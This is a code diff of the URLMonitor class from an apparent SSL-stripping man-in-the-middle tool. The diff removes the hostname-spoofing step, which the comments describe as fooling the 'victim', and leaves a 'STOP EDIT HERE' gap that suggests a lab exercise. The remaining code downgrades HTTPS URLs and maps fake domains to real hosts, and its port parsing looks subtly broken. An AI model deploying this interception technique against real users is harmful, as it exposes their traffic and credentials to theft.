@@ -41,17 +41,13 @@ class URLMonitor:
         methodIndex = url.find("//") + 2
         method      = url[0:methodIndex]
         pathIndex   = url.find("/", methodIndex)
-
         if pathIndex is -1:
             pathIndex = len(url)
             url += "/"
-
         host        = url[methodIndex:pathIndex].lower()
         path        = url[pathIndex:]
-
         port        = 443
         portIndex   = host.find(":")
-
         if (portIndex != -1):
             host = host[0:portIndex]
             port = host[portIndex + 1:]
@@ -62,18 +58,14 @@ class URLMonitor:
         # if host starts with "www." add a 4th w
         # otherwise if there's no "www." at the beginning add something
         # that the victim shouldn't notice (like "web")
-        if host[:4] == "www.":
-            # You have to save in fake_domain the spoofed hostname
-            fake_domain = "w" + host
-        else:
-            fake_domain = "web" + host
+        #
+        #
         # STOP EDIT HERE
         logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host, fake_domain))
         url = 'http://' + host + path
         self.real[fake_domain] = host
         self.strippedURLs.add((client, url))
         self.strippedURLPorts[(client, url)] = int(port)
-
         return 'http://' + fake_domain + path
 
     def setFaviconSpoofing(self, faviconSpoofing):
